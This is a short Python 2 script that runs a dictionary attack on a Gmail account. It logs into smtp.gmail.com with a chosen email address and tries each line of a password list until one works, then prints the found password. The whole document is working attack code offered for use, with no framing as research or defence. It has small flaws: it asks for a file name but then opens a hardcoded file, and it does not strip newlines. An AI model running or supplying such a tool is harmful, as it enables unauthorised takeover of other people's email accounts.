import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("enter email address: ")
passw = raw_input("enter the password file name: ")
passw = open('gmailpass.txt', "r")
db = 1
for i in passw:
    try:
        smtpserver.login(user, i)
        print "correct", db
        print "[+] password found: %s" % i
        db+=1
        break;
    except smtplib.SMTPAuthenticationError as e:
        #print "error: ", e
        print "[!] password incorrect: %s" % i
        print db
        db+=1

